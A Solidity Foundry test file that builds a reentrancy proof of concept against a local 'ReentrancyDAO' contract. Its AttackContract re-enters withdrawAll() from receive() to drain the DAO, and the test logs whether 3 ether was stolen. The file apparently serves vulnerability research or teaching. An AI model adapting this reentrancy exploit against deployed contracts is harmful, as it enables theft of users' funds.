// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrancy_dao.sol";

contract ReentrancyDAO_Test is Test {
    ReentrancyDAO public dao;
    AttackContract public attacker;

    address public alice = address(0xBEEF);

    function setUp() public {
        dao = new ReentrancyDAO();
        attacker = new AttackContract(address(dao));
        vm.deal(alice, 2 ether);
    }

    function test_reentrancyAttack() public {
        // Alice deposits 2 ether
        vm.prank(alice);
        dao.deposit{value: 2 ether}();
        
        // Give attacker contract 1 ether
        vm.deal(address(attacker), 1 ether);
        // Attacker deposits using its own balance
        attacker.deposit();
        
        console.log("--- BEFORE-Trigger Attack ---");
        uint256 daoBalanceBefore = address(dao).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 totalDepositsBefore = dao.totalDeposits();
        uint256 totalWithdrawalsBefore = dao.totalWithdrawals();
        
        console.log("DAO balance before: %s", daoBalanceBefore);
        console.log("Attacker balance before: %s", attackerBalanceBefore);
        console.log("Total deposits before: %s", totalDepositsBefore);
        console.log("Total withdrawals before: %s", totalWithdrawalsBefore);
        
        console.log("--- Trigger Attack ---");
        // Execute attack
        attacker.attack();
        
        console.log("--- AFTER-Trigger Attack ---");
        uint256 daoBalanceAfter = address(dao).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 totalDepositsAfter = dao.totalDeposits();
        uint256 totalWithdrawalsAfter = dao.totalWithdrawals();
        
        console.log("DAO balance after: %s", daoBalanceAfter);
        console.log("Attacker balance after: %s", attackerBalanceAfter);
        console.log("Total deposits after: %s", totalDepositsAfter);
        console.log("Total withdrawals after: %s", totalWithdrawalsAfter);
        
        // Vulnerability verification logic
        bool fundsStolen = (daoBalanceAfter == 0) && 
                           (attackerBalanceAfter == 3 ether);
        bool depositsMatch = totalDepositsAfter == totalDepositsBefore;
        bool withdrawalsIncreased = totalWithdrawalsAfter > totalWithdrawalsBefore;
        
        if (fundsStolen && depositsMatch && withdrawalsIncreased) {
            console.log("Vulnerability Exists: DAO completely drained, attacker stole 3 ether");
        } else {
            console.log("Vulnerability not Exist: Attack failed to drain DAO unexpectedly");
        }
    }
}

contract AttackContract {
    ReentrancyDAO public dao;
    uint256 public count;

    constructor(address _dao) {
        dao = ReentrancyDAO(_dao);
    }

    function deposit() public {
        dao.deposit{value: address(this).balance}();
    }

    function attack() public {
        count = 0;
        dao.withdrawAll();
    }

    receive() external payable {
        count++;
        if (count < 3) {
            dao.withdrawAll();
        }
    }
}